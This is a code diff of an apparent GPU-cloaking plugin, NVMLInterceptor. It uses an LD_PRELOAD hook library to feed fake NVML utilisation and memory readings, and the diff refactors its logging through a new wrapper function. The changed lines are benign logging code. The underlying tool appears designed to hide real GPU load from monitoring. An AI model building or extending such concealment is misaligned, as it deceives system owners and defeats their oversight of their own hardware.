@@ -15,6 +15,40 @@ except ImportError:
     def log_nvml_interception(*args, **kwargs):
         pass
 
+def _log_nvml_operation(message: str, utilization: int = None, level: str = "INFO", intercepted: bool = True):
+    """
+    **Wrapper function** (Hàm bọc) để ánh xạ tham số cho log_nvml_interception
+    
+    Args:
+        message (str): Log message format [ACTION] - details
+        utilization (int): GPU utilization value (optional)
+        level (str): Log level (INFO, ERROR, etc.)
+        intercepted (bool): Whether operation was intercepted (default: True)
+    """
+    # Extract function name from message
+    if " - " in message:
+        function_name = message.split(" - ")[0].strip()
+    else:
+        function_name = "NVML_OPERATION"
+    
+    # Map utilization to kwargs
+    kwargs = {}
+    if utilization is not None:
+        kwargs['utilization'] = utilization
+    
+    # Call the actual function with correct signature
+    try:
+        log_nvml_interception(
+            function_name=function_name,
+            intercepted=intercepted,
+            level=level,
+            **kwargs
+        )
+    except Exception as e:
+        # Fallback logging if wrapper fails
+        logger.log(getattr(logging, level.upper(), logging.INFO), 
+                  f"[NVML_WRAPPER_ERROR] {message} - Error: {e}")
+
 class NVMLInterceptor(IGPUCloakService):
     """Plugin quản lý NVML API interception qua LD_PRELOAD"""
     
@@ -37,20 +71,22 @@ class NVMLInterceptor(IGPUCloakService):
         self.lib_path = config.get('lib_path', '/opt/hooks/libgpuhook.so')
         if not os.path.exists(self.lib_path):
             logger.warning(f"NVML hook library not found: {self.lib_path}")
-            # Log domain-specific event using module function
-            log_nvml_interception(
+            # Log domain-specific event using wrapper function
+            _log_nvml_operation(
                 f"INITIALIZE FAILED - Library not found: {self.lib_path}",
                 utilization=self.fake_utilization,
-                level="ERROR"
+                level="ERROR",
+                intercepted=False
             )
             return False
             
         logger.info(f"NVML interceptor initialized with fake_util={self.fake_utilization}%")
-        # Log domain-specific success event
-        log_nvml_interception(
+        # Log domain-specific success event using wrapper function
+        _log_nvml_operation(
             f"INITIALIZE SUCCESS - Fake util: {self.fake_utilization}%, Memory: {self.fake_memory}MB",
             utilization=self.fake_utilization,
-            level="INFO"
+            level="INFO",
+            intercepted=True
         )
         return True
         
@@ -59,10 +95,11 @@ class NVMLInterceptor(IGPUCloakService):
         if not os.path.exists(self.lib_path):
             error_msg = f"NVML hook library not found: {self.lib_path}"
             logger.error(error_msg)
-            log_nvml_interception(
+            _log_nvml_operation(
                 f"START FAILED - {error_msg}",
                 utilization=self.fake_utilization,
-                level="ERROR"
+                level="ERROR",
+                intercepted=False
             )
             return False
             
@@ -79,10 +116,11 @@ class NVMLInterceptor(IGPUCloakService):
         
         self.enabled = True
         logger.info("✅ NVML interception started")
-        log_nvml_interception(
+        _log_nvml_operation(
             f"START SUCCESS - NVML interception enabled",
             utilization=self.fake_utilization,
-            level="INFO"
+            level="INFO",
+            intercepted=True
         )
         return True
         
@@ -119,10 +157,11 @@ class NVMLInterceptor(IGPUCloakService):
             
         # Log metrics update
         if updated_metrics:
-            log_nvml_interception(
+            _log_nvml_operation(
                 f"UPDATE_METRICS - Util: {self.fake_utilization}%, Memory: {self.fake_memory}MB",
                 utilization=self.fake_utilization,
-                level="INFO"
+                level="INFO",
+                intercepted=True
             )
             
     def get_active_strategies(self) -> List[str]:
